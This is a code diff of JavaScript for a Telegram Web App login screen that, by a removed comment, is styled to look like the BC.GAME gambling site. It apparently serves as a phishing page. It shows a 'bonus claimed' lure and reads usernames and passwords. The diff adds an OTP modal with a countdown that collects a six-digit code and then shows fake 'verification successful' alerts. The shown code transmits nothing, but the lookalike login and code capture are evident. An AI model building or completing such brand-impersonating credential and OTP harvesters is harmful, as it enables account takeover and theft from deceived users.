@@ -1,66 +1,101 @@
 // Initialize Telegram Web App
 const tg = window.Telegram.WebApp;
-tg.expand(); // Expand to full height
+tg.expand();
 
-// Tab switching logic
+// Elements
 const tabs = document.querySelectorAll('.tab');
+const usernameInput = document.getElementById('username');
+const passwordContainer = document.getElementById('password-container');
+const forgotPassword = document.getElementById('forgot-password');
+const loginForm = document.getElementById('login-form');
+const otpModal = document.getElementById('otp-modal');
+const modalClose = document.getElementById('modal-close');
+const confirmBtn = document.getElementById('confirm-btn');
+const timerEl = document.getElementById('timer');
+
+let currentTab = 'password';
+
+// Tab switching
 tabs.forEach(tab => {
     tab.addEventListener('click', () => {
         tabs.forEach(t => t.classList.remove('active'));
         tab.classList.add('active');
+        currentTab = tab.dataset.tab;
         
-        // Update placeholder based on tab
-        const usernameInput = document.getElementById('username');
-        if (tab.dataset.tab === 'otp') {
+        if (currentTab === 'otp') {
             usernameInput.placeholder = 'Email / Phone Number';
+            passwordContainer.style.display = 'none';
+            forgotPassword.style.display = 'none';
         } else {
             usernameInput.placeholder = 'Email / Phone Number / Username';
+            passwordContainer.style.display = 'block';
+            forgotPassword.style.display = 'block';
         }
     });
 });
 
-// Password visibility toggle
-const togglePassword = document.querySelector('.toggle-password');
-const passwordInput = document.getElementById('password');
-
-togglePassword.addEventListener('click', () => {
-    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-    passwordInput.setAttribute('type', type);
-    
-    // Change icon if needed (can be added later)
-});
-
-// Close button
-document.getElementById('close-btn').addEventListener('click', () => {
-    tg.close();
+// Password visibility
+document.querySelector('.toggle-password').addEventListener('click', () => {
+    const passwordInput = document.getElementById('password');
+    passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
 });
 
 // Form submission
-document.getElementById('login-form').addEventListener('submit', (e) => {
+loginForm.addEventListener('submit', (e) => {
     e.preventDefault();
     
-    const username = document.getElementById('username').value;
-    const password = passwordInput.value;
-
-    // Show a loading state on the button
-    const submitBtn = e.target.querySelector('.submit-btn');
-    const originalText = submitBtn.textContent;
-    submitBtn.textContent = 'Signing in...';
-    submitBtn.disabled = true;
-
-    // Send data back to the bot
-    // In a real scenario, you'd send this to your backend
-    // But since this is a Web App, we can use sendData for simple interactions
-    // Or just show a success message
-    
-    setTimeout(() => {
-        tg.showAlert('Sign in successful! Your bonus has been claimed.');
-        tg.close();
-    }, 1500);
+    if (currentTab === 'otp') {
+        openOTPModal();
+    } else {
+        const username = usernameInput.value;
+        const password = document.getElementById('password').value;
+        
+        // Simulating standard login
+        tg.showConfirm(`Sign in as ${username}?`, (ok) => {
+            if (ok) {
+                tg.close();
+            }
+        });
+    }
 });
 
-// Handle theme changes from Telegram
-tg.onEvent('themeChanged', () => {
-    // You could adjust colors here if needed to match TG theme
-    // but the user wants it to look like BC.GAME (dark)
+// OTP Modal Logic
+function openOTPModal() {
+    otpModal.style.display = 'flex';
+    startTimer(46);
+}
+
+function startTimer(seconds) {
+    let timeLeft = seconds;
+    const interval = setInterval(() => {
+        timeLeft--;
+        timerEl.textContent = timeLeft;
+        if (timeLeft <= 0) clearInterval(interval);
+    }, 1000);
+}
+
+modalClose.addEventListener('click', () => {
+    otpModal.style.display = 'none';
+});
+
+confirmBtn.addEventListener('click', () => {
+    const otp = document.getElementById('otp-input').value;
+    const username = usernameInput.value;
+
+    if (otp.length === 6) {
+        confirmBtn.textContent = 'Verifying...';
+        confirmBtn.disabled = true;
+
+        setTimeout(() => {
+            tg.showAlert(`Verification successful for ${username}!`);
+            tg.close();
+        }, 1500);
+    } else {
+        tg.showAlert('Please enter a valid 6-digit code.');
+    }
+});
+
+// Close WebApp
+document.getElementById('close-btn').addEventListener('click', () => {
+    tg.close();
 });
